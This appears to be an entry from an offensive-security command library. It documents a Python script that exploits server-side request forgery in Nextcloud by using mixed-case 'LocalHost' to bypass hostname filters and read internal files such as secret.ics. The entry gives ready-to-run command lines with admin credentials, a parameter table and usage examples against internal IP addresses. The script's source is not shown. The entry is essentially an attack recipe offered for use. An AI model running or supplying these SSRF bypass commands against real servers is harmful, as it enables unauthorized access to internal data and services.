---
id: 123e4567-e89b-12d3-a456-426614174007
name: python-nextcloud-ssrf-case-bypass
type: command
executor: bash
data: >-
  python nextcloud_ssrf.py http://192.168.0.104/nextcloud/nextcloud/ admin
  [pass] http://LocalHost/secret.ics
output: Contents of the internal secret.ics file
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:47.921Z'
platforms:
  - Linux
  - Web
tags:
  - ssrf
  - bypass
  - automation
verified: false
validated: true
submitted: true
---

# python-nextcloud-ssrf-case-bypass

## Command

```bash
python nextcloud_ssrf.py http://192.168.0.104/nextcloud/nextcloud/ admin [pass] http://LocalHost/secret.ics
```

## Description

This command executes a Python script for SSRF automation in Nextcloud, leveraging case variation 'LocalHost' to bypass hostname filters and retrieve internal ICS content via authenticated request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| base_url | Nextcloud base URL | Yes |
| username | Login username | Yes |
| password | Login password | Yes |
| target_url | SSRF target with case bypass (e.g., http://LocalHost/secret.ics) | Yes |

## Examples

### Basic Usage

```bash
python nextcloud_ssrf.py http://target.com/ user pass http://LocalHost/file
```

### Advanced Usage

For different internal targets.

```bash
python nextcloud_ssrf.py http://192.168.0.1/nextcloud/ admin pass http://lOcAlHoSt/config
```

## Expected Output

The script prints the contents of the internal secret.ics file, verifying the bypass success.

## Related

- [[commands/python-nextcloud-ssrf-ipv6-bypass]]
- [[procedures/Automate-SSRF-Exploitation-with-Python-Script]]
